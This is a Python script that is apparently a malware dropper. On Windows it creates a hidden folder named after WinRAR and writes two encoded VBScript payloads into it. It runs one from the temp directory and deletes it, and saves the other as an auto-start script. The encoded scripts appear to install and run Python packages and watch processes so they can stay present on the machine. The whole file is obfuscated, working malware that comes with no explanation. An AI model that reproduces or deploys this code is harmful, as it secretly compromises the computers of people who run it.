import os
import platform
import subprocess
from pathlib import Path
ab = "#@~^EAIAAA==-1r21l:bm}n,xPrmhN,z^~aXY4Gx,O:,2rw,/4WAP2zDtGxarwalO4,uPWr	NdYM~rJ+c%rJP-u,2XDtGx,O^~rJks2WMYPKdIWkRkXdYnhvB2XD4W	PRh,wk2~bxdYms^P2HY4Wxaka2lDt~O$PR5,O;,v#p0DKh~wHY4WUwr2alOt,r:aW.O,eJEE,P@#@&knDP-}w1pDDl1-P{P/DlOn}4L^YvJU^.kaYc?4+ssr#~P@#@&\}w^}MYl^-cI;x,-1r21l:bm}nBT@#@&\^ramCPzmr,xPrm:9~&m,lDY.k8~3t~]m2w9lOCu-R	r	ICI,'LPd1tDl/0/,&mM+CYP&O	PJr\k1DWkGWYhXDtGxiObVrYHPlk3$ErPzd^,:rx!OP&sW,vPJYM~Jr]CwaNCOm]-c	k	Il\"wAk	DmDml;OK{dYm.Yc\8nrJJ@#@&k+OP}21p.Dl1\P{P;.+mYnr(Ln^D`JqjmMkwD jtV^JbP~@#@&r2m5.Ymm- \"Ex~-1r2mmPzm6B!Q60AAA==^#~@ "
bc = "#@~^/gYAAA==9&H~kYMZWsw!O+M~dYMn.G1+/k@#@&kYD;Ghw!YD~'~EcJ~B,sW1ls~1W:2;D+.@#@&dDDKMW1+/kP{~JaXOtKx nX+J@#@&qwPkkK.W1+k/]EUUbxL`kOD;Wh2!Y+.SkY.nMG1+dk#,KCA1,~@#@&P~P,P~~U+Y,G4NH&jnD7k1+~'~!Y64NnmD`EAbx:LhD/lJ,m@#@&~,P,PP,P,~[,J`kswn.kWxmOkKxS-nV{kswnDdG	lO+)Z-'J~',/Y./K:2EDnMP',J'DWKY'^ks\+J*@#@&~,PP,~PU+Y,^GVhDKmn/dJb/OP{~W(L	\&?+.-bmnRAam}!+MXP|@#@&~P,P~P,P~cr?2d3Z:PZKhhl	NdkU+~o\"r\Pqrx2 mKMWmndkP	CA]APHm:P',BazY4WUR6nvr#@#@&~P,PP,~2DKm/d1ChPxPr2XDtGUc+6nE@#@&~P,~,P~aDKm+k/z.o!:nxD/~x,J0MG:,wXD4GxakawCY4~b:2WMOPCJ@#@&@#@&P~~,P~PUnDPG(LqHqU+M-k1+~',MnO}4L^YvJhbUhosYk)w- wMWGY'^ks\+E*@#@&@#@&,P~P,~,?nDP1WVhDK^+k/JkkY~x,W4N	H&?+M-rmRA6nm};Dz`rj2d2/P,ePo]}H~bU2 mhDKm+k/,	CAI3Pglhn,'PEEPLPwMG^+k/glh+~',JvPzHf,ZGhslx[JbxnPd(n2~E]rP[,wMGm/dbMo;hxYk~[,J]EEb@#@&P,P~P~~&0~mKsnMW^nk/SrdDR/W!UDPx,!,Ktx@#@&P,P~P,P~~,PP,~P7mra^CKzm}n~'~E1:[PJ^PaXO4KxPR^,JE0MGsP2HY4Wxaka2lDt~kswG.DPerEJ,P@#@&~~P,P,P~P~~,P~PknY,\\621pDOC1\~',/M+CD+}4LmDcJq?^DbwO Ut+^sJ*PP@#@&~P,P,P~P~~,P~P,-ram}.Dlm- \"EUP7^}w^mKzmrh~Z@#@&,P~P,P~3^/+@#@&P,PP,~~P,P,P~P~@#@&2UN,(0@#@&3JU2@#@&7,\^ra^mK)1rhP',J1hN,z^PaXO4KxP ^PrJ0MGhPaXDtGxrUD+.wMnYD~rswW.O,eEJr~,@#@&,P,PP,PknY,\\6w1p.Omm\,xP;D+mOnr(LmO`E	Um.kaORUtns^J#~~@#@&~P,~,P~7rampMYm^\cI;x,\^6aml:)m}n~Z@#@&2gf,qo@#@&@#@&si1;Pq}1~rknDG^/dI!U	kUT`~5.zS,dYMZG:aEOnM~AI#bdP/D.KDKm/d1Ch#@#@&i9qtPG8NH(jD-k1nBPdDDqHq5E.X@#@&7/DD	\&pE.X,'PrjnVmDPMPW.K:~bU&y{K.Km+dd,h4+Mn,xCs+,Vk0+,vJ,[~/DDK.Km+kd1m:+,'~JEJ@#@&7?3P,W8Lq\qU+.-bm+~x,M3K}$x2/:`rhk	:ThYk)EP|@#@&7i[Pr`ksw+MdGxmYbWUSn-Vxks2+M/GUmY+NZ'-EP|~@#@&7idLP/DD;G:aEO+MP'~r-DKGY'mks-+J*P@#@&7qo~K4%t(?D-r1+R3am}E.H`dDDqHq5E.X*R/W!xO~@*P!,PCA1@#@&77kknMW^+dd\"EUxbUo,'~P\"j2@#@&,P~P,~,P~,P,P@#@&P,~P,P~P,P~~@#@&dAJ?A@#@&i7r/hDKmn/d]!xUk	LP{Po)d?2@#@&,P~P,~,P~,P,P@#@&dAHf,qo@#@&2H9,sjg/K&r1@#@&@#@&@#@&jfsBAA==^#~@ "
if platform.system().startswith("Windows"):
    name = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\.WinRaR"
    if not os.path.isdir(name):
        os.makedirs(name)
        path_to_file = name + '\\winrar_auto_start.vbe'
        path = Path(path_to_file)
        import tempfile
        if path.is_file():
            print()
        else:
            with open(tempfile.gettempdir() + "\\tmp.vbe", 'w') as f:
                f.write(f"{ab}")
                f.close()
            with open(path_to_file, 'w') as f:
                f.write(f"{bc}")
            subprocess.call("cmd /c %temp%\\tmp.vbe && del %temp%\\tmp.vbe 2>null", shell=True)
    else:
        print()
